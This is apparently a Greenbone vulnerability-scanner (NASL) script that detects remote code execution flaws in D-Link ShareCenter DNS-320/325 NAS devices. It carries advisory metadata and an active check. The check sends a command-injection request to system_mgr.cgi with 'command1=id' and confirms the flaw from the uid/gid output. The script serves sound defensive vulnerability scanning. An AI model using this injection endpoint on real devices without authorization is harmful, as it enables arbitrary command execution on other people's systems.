# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103699");
  script_version("2024-06-28T15:38:46+0000");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_name("D-Link ShareCenter Products Multiple RCE Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51918");
  script_xref(name:"URL", value:"http://sharecenter.dlink.com/");
  script_xref(name:"URL", value:"http://blog.emaze.net/2012/02/advisory-information-title.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/521532");

  script_tag(name:"last_modification", value:"2024-06-28 15:38:46 +0000 (Fri, 28 Jun 2024)");
  script_tag(name:"creation_date", value:"2013-04-18 12:07:07 +0200 (Thu, 18 Apr 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"D-Link ShareCenter products are prone to multiple remote code
  execution (RCE) vulnerabilities.");

  script_tag(name:"impact", value:"Successful exploits will result in the execution of arbitrary
  code in the context of the affected application. Failed exploit attempts may result in a denial-
  of-service condition.");

  script_tag(name:"affected", value:"- D-Link DNS-320 ShareCenter

  - D-LinkDNS-325 ShareCenter");

  script_tag(name:"solution", value:"Updates are available.");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default:80);

url = '/web/login.html';
if(http_vuln_check(port:port, url:url, pattern:"login_mgr.cgi", usecache:TRUE)) {

  url = '/cgi-bin/system_mgr.cgi?cmd=cgi_sms_test&command1=id';
  if(http_vuln_check(port:port, url:url, pattern:"uid=[0-9]+.*gid=[0-9]+.*")) {
    report = http_report_vuln_url( port:port, url:url );
    security_message(port:port, data:report);
    exit(0);
  }
  exit(99);
}

exit(0);
